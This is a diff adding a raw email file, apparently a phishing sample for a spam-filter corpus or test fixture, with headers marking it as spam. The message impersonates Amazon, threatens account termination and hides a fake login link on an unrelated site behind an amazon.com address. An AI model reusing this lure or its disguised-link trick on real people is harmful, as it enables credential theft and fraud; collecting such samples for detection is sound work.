@@ -1,0 +1,180 @@
+From nobody Sun Jan 25 13:50:00 2015
+Return-Path: <security@amazon-account.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id 3DBBA468DC
+ for <user@login.example.com>; Wed,  8 Nov 2006 06:50:17 -0500 (EST)
+Received: from localhost (localhost [127.0.0.1])
+ by mail.example.org (Postfix) with ESMTP id E72C9131F936
+ for <user@example.com>; Wed,  8 Nov 2006 06:50:16 -0500 (EST)
+X-Spam-Flag: YES
+X-Spam-Score: 14.629
+X-Spam-Level: **************
+X-Spam-Status: Yes, score=14.629 tagged_above=-100 required=4
+ tests=[FORGED_MUA_OUTLOOK=3.36, FORGED_OUTLOOK_HTML=2.514,
+ FORGED_OUTLOOK_TAGS=2.369, HTML_FONT_FACE_BAD=0.452,
+ HTML_MESSAGE=0.001, MIME_HTML_ONLY=0.001, NO_REAL_NAME=0.55,
+ RAZOR2_CF_RANGE_51_100=0.5, RAZOR2_CF_RANGE_E4_51_100=1.5,
+ RAZOR2_CHECK=2.5, SPF_HELO_PASS=-0.001, UNDISC_RECIPS=0.883]
+Received: from mail.example.org ([127.0.0.1])
+ by localhost (spammy.monkey.org [127.0.0.1]) (amavisd-new, port 10024)
+ with ESMTP id 9AvpBTcLBBWk for <user@example.com>;
+ Wed,  8 Nov 2006 06:50:13 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+ by mail.example.org (Postfix) with ESMTP
+ for <user@example.com>; Wed,  8 Nov 2006 06:50:13 -0500 (EST)
+Received: from hosting.ponyclub.org (hosting.ponyclub.org [64.191.167.194])
+ by mail.example.org (Postfix) with ESMTP id D37B06FA477
+ for <user@example.com>; Wed,  8 Nov 2006 06:50:13 -0500 (EST)
+X-ClientAddr: 203.215.180.41
+Received: from User ([203.215.180.41]) (authenticated bits=0)
+ by hosting.ponyclub.org (8.12.11/8.12.11) with ESMTP id kA8CEbIN018631;
+ Wed, 8 Nov 2006 07:14:41 -0500
+Message-Id: <200611081214.kA8CEbIN018631@hosting.ponyclub.org>
+Reply-To: <security@amazon-account.com>
+From: "Amazon.com"<security@amazon-account.com>
+Subject: Login and update your Amazon.com account by checking the link below
+ immediately
+Date: Wed, 8 Nov 2006 16:41:02 +0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2800.1081
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1081
+X-Ponyclub-MailScanner-Information: Please contact the ISP for more information
+X-Ponyclub-MailScanner: Found to be clean
+X-MailScanner-From: security@amazon-account.com
+To: undisclosed-recipients:;
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 436
+
+<div id=message> <!-- type = text --> <html><xbody bgcolor"#FFFFFF"
+link="#0066CC"> <table width="584" border="0" cellspacing="0"
+cellpadding="1" align="center"> <tr>
+    	<td valign="middle">
+	<img
+src="http://g-images.amazon.com/images/G/01/x-locale/misc/amazon-logo-table-top.gif"  
+height="48" alt="Amazon.com" border="0" width="584" />
+	</td> </tr> </table> <center> <table width="584" border="0"
+cellspacing="0" cellpadding="1" bgcolor="#cccc99"> <tr valign="top">
+	<td> <table width="580" border="0" cellspacing="0" cellpadding="0"
+bgcolor="#cccc99" height="100%" align="center">
+        <tr bgcolor="#FFFFFF" valign="top">
+        	<td> <table width="98%" border="0" cellspacing="0"
+cellpadding="0" height="100%" align="center">
+                <tr valign="top">
+                	<td> <table width="100%" border="0"
+cellspacing="0" cellpadding="8">
+                        <tr>
+        		        <td valign="top"> <table> <tr><td> <font
+face=verdana,arial,helvetica size=-1>
+	Dear Customer, <p>
+			<P><FONT FACE="Helvetica, Arial, Times New
+Roman"><FONT SIZE=2 STYLE="font-size: 9pt">-
+			Due to recent account takeovers and unauthorized
+listings, Amazon is
+			requesting a new account verification procedure.
+>From time to
+			time, randomly selected accounts (seller and/or
+buyer)are placed
+			under an advanced updating process based on
+merchant accounts/bank
+			relationsand on-file credit cards. Amazon may also
+request in an
+			email message scanned/faxed copies of one or more
+photo ID's. Your
+			account confirmation may go wrong if your credit
+card/bank account
+			has expired, or if you have changed/replaced your
+credit card without letting us know about the change.</FONT></FONT></P>
+			<UL>
+				<LI><P STYLE="margin-bottom: 0in"><FONT
+FACE="Helvetica, Arial, Times New Roman"><FONT SIZE=2 STYLE="font-size:
+9pt">Your
+				account is not suspended, but if in 36
+hours after you receive
+				this message your account is not confirmed
+we reserve the right
+				to terminate your Amazon
+subscription.</FONT></FONT></P>
+				<LI><P STYLE="margin-bottom: 0in"><FONT
+FACE="Helvetica, Arial, Times New Roman"><FONT SIZE=2 STYLE="font-size:
+9pt">If
+				you received this notice and you are not
+an authorized Amazon
+				account holder, please be aware that it is
+in violation of Amazon
+				policy to represent oneself as an Amazon
+user. Such action may also
+				be in violation of local, national, and/or
+international law.</FONT></FONT></P>
+				<LI><P STYLE="margin-bottom: 0in"><FONT
+FACE="Helvetica, Arial, Times New Roman"><FONT SIZE=2 STYLE="font-size:
+9pt">Amazon
+				is committed to assist law enforcement
+with any inquires related
+				to attempts to misappropriate personal
+information with the
+				intent to commit fraud or theft.
+</FONT></FONT>
+				</P>
+				<LI><P STYLE="margin-bottom: 0in"><FONT
+FACE="Helvetica, Arial, Times New Roman"><FONT SIZE=2 STYLE="font-size:
+9pt">Information
+				will be provided at the request of law
+enforcement agencies to
+				ensure that perpetrators are prosecuted to
+the full extent of the
+				law.</FONT></FONT></P>
+			</UL> <p> </td> <td> </td> </tr></table> <b><font
+face=verdana,arial,helvetica color=#CC6600> To confirm your identity with
+us click the link bellow: </font></b><br> <font
+face=verdana,arial,helvetica size=-1> <p> <li><a target="_blank"  
+href="http://www.phideltathetatnz.org/coppermine/albums/userpics/10018/www.amazon.com/login.php"
+>http://www.amazon.com/exec/obidos/sign-in.html <!--
+reviewLink:0060558121:ARNU07N2YIKP1 --></a><p><a target="_blank" </ul>
+</font> <p> <font face=verdana,arial,helvetica size=-1> <p> </p>
+			<P STYLE="margin-bottom: 0in"><FONT
+FACE="Helvetica, Arial, Times New Roman"><FONT SIZE=2 STYLE="font-size:
+9pt">We
+			apologize in advance for any inconvenience this
+may cause you and
+			we would like to thank you for your cooperation as
+we review this
+			matter. </FONT></FONT>
+			</P>
+			<P STYLE="margin-bottom: 0in"><BR>
+			</P>
+			<P><FONT FACE="Helvetica, Arial, Times New
+Roman"><FONT SIZE=2 STYLE="font-size: 9pt">Respectfully,<BR>Amazon.com,
+Inc. </FONT></FONT></P> </font>
+			</td>
+                        </tr>
+                      	</table>
+                  	</td>
+                </tr>
+              	</table>
+            	</td>
+        </tr>
+        </table>
+        </td> </tr> </table> <p> <table width=584 border=0> <tr>
+      <td align=center> <font face=verdana,arial,helvetica size=-1>
+Copyright
+        2006 Amazon.com, Inc. All rights reserved. </font>
+        <p align="center"> <font size="-4"
+face="verdana,arial,helvetica">Amazon
+          sent this e-mail to you because your Notification Preferences
+indicate
+          that you want to receive information about Special Events &
+Promotions.
+          Amazon will request personal data (password, credit card/bank
+numbers)
+          only on our home site, wich is securely incrypted with
+SLL.</font> </td>
+    </tr> </table> </center> </xbody></html></font>
